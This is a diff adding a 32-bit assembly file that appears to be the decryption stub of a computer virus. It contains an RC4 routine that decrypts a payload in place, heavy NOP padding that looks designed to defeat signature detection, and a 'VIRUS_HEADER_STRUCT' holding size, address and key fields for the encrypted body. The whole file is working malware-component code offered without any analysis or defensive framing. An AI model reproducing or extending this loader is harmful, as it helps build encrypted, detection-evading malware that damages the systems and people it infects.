@@ -1,0 +1,480 @@
+BITS 32
+
+global loader
+global _GET_HEADER_VIRUSE:
+
+;; -- rc4(char *key, char *value, size_t len_key, size_t len_code ) -- ;;
+
+loader:
+	
+	;; -- /* [START] S initialization */
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+		PUSH EBP
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+		MOV EBP, ESP
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+		SUB ESP, 0X400
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+		XOR ECX,ECX
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+		XOR EDI,EDI
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+		MOV EDI,0X01
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+		SHL EDI,0X08
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+
+		encrypt.fill:
+			MOV [ESP+42+ECX],ECX
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+			INC ECX
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+			CMP ECX, EDI
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+			JNE encrypt.fill
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+	;; -- /* [END] S initialization */
+
+	;; -- /* [START] K initialization */
+		MOV EDX,[EBP+8] 
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+		MOV EDI,[EBP+16]
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+		MOV ESI,ESP
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+		ADD ESI,300
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+ 
+		MOV ECX,0X01
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+		SHL ECX,0X08
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+		XOR EBX,EBX 
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+
+	LOOP_J:
+		CMP EBX,EDI
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+		JL CONTINUE_LOOP  
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+		XOR EBX,EBX 
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+
+	CONTINUE_LOOP: 
+		MOV AH, [EDX + EBX]  
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+		MOV [ESI], AH   
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+		INC ESI 
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+		INC EBX
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+		DEC ECX 
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+		JNZ LOOP_J 
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+	;; -- /* [END] K initialization */
+
+	;; -- /* [START] Permutation */ -- ;;
+	XOR EDX, EDX
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+	MOV EDI,ESP
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+	ADD EDI,42
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+	XOR EBX,EBX 
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+	SUB ESI,0X100 
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+	XOR EAX,EAX 
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+	MOV ECX,0X100
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+
+	LOOP_S: 
+		MOV DL,[ESI+EAX] 
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+		ADD BL,DL 
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+		MOV DL,[EDI+EAX]
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+		ADD BL,DL 
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+		MOV DH,[EDI+EBX] 
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+		MOV [EDI+EAX],DH 
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+		MOV [EDI+EBX],DL 
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+		INC EAX 
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+		DEC ECX
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+		JNZ LOOP_S
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+	;; -- /* [END] Permutation */ -- ;;
+
+	PRGA: 
+		MOV ESI,[EBP+12] 
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+		MOV EDI,ESP
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+		ADD EDI,42
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+		MOV EDX,ESI 
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+
+		XOR EAX,EAX
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+		XOR EBX,EBX
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+
+		MOV ECX,[EBP+20] 
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+	CD: 
+		PUSH ECX 
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+		MOVZX ECX,AL
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+		INC CL
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+		PUSH EDX
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+		MOV DH,[EDI+ECX]
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+		ADD BL,DH
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+		MOV DL,[EDI+EBX]
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+		MOV [EDI+ECX],DL
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+		MOV [EDI+EBX],DH
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+		ADD DL,DH
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+		MOVZX EDX,DL
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+		MOV DL,[EDI+EDX]
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+		MOV CL,[ESI+EAX]
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+		XOR CL,DL 
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+		POP EDX
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+		MOV [EDX+EAX],CL
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+		INC EAX
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+		POP ECX
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+		DEC ECX
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+		JNZ CD
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+		LEAVE
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+		RET
+
+_GET_HEADER_VIRUSE:
+	LEA EAX, [REL VIRUS_HEADER_STRUCT]
+	RET
+
+
+VIRUS_HEADER_STRUCT:
+	db 0x00, 0x00, 0x00, 0x00,                                                                        ;; -- SIZE -- ;;
+	db 0xFE, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF 		                                  ;; -- ADDRESS -- ;;
+	db 0X00, 0X00, 0X00, 0X00, 0X00, 0X00, 0X00, 0X00, 0X00, 0X00, 0X00, 0X00, 0X00, 0X00, 0X00, 0X00 ;; -- KEY -- ;;
+	
